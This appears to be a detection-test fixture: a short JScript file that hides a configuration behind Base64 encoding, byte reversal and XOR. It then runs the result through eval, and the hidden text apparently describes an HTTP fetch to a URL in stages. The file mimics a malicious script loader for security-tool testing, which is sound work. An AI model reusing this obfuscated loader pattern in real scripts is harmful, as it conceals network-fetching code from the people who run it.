// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_229bd904 = function decode_229bd904_body(storedMaterial) {
  var recoveredMaterial = storedMaterial.slice(0);
  recoveredMaterial.reverse();
  for (var i = 0; i < recoveredMaterial.length; i++) { recoveredMaterial[i] = recoveredMaterial[i] ^ 48; }
  return recoveredMaterial;
};
var recover_7d76a2d9 = function recover_7d76a2d9_body() {
  // configuration reconstruction
  var packedText = "TQIKEkReRV9zVVdRREMSHE0SBlEDBgBTA1ZTCB9SUXxDQ1VCRF5FeBIKEkReVVdRb0JVQ0USHBJEUV" + "QeUVVTAgIFVlMfVFlcUUZeWR5VXEBdUUhVHgZRAwYAUwNWUwgfHwpDQEREWBIKElxCRRIcEgZRAwYA" + "UwNWUwgdXldZUUBdUVMSChJUWW9eV1lRQF1RUxJLChJDVUVcUUYSHBIAHgYeYGRkeHx9aB4CfH1oY3" + "0SChJCVURAUVRREhxtEklCX11VXW9YU0RRQENZVBIcElVEX11VQm9VQllFQVNREmsKEkNAVURDEks=";
  var storedMaterial = decodeBase64(packedText);
  var harmlessValue = "PROCESSOR_ARCHITECTURE";
  var recoveredMaterial = [];
  for (var pass = 0; pass < 1; pass++) { recoveredMaterial = decode_229bd904.apply(null, [storedMaterial]); }
  var configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "", bi = 1;
  for (bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
  // end reconstruction
};
var inspect_927edad1 = function inspect_927edad1_body() {
  var configuration = eval("(" + recover_7d76a2d9.apply(null, []) + ")");
  var table = { steps: function() { return configuration.steps; }, values: function() { return configuration.values; } };
  return { steps: table.steps.apply(null, []), adapter: configuration["adapter"], values: table["values"].apply(null, []), stageCount: configuration["stageCount"] };
};
